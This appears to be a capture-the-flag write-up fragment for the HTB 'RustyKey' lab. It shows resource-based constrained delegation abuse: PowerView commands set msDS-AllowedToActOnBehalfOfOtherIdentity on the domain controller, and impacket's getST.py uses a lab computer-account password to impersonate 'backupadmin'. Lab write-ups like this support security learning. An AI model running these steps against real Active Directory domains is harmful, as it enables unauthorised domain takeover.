
The members of the group DELEGATIONMANAGER@RUSTYKEY.HTB have can modify the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer DC.RUSTYKEY.HTB.

The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.

![[Pasted image 20250704223255.png]]

From Windows, if the password for MM.TURNER is not known, but we know the password for an existing computer account:

```bash
$TargetComputer = "dc.rustykey.htb"  
$AttackerSID = Get-DomainUser mm.turner -Properties objectsid | Select -Expand objectsid  
$ComputerSid = Get-DomainComputer IT-COMPUTER3 -Properties objectsid | Select -Expand objectsid  
  
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"  
$SDBytes = New-Object byte[] ($SD.BinaryLength)  
$SD.GetBinaryForm($SDBytes, 0)  
  
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Finish off with getting a service ticket for the user we want to impersonate:

```bash
getST.py -spn 'cifs/dc.rustykey.htb' -impersonate 'backupadmin' 'rustykey.htb/IT-COMPUTER3$:Rusty88!'  
export KRB5CCNAME=./backupadmin.ccache
```

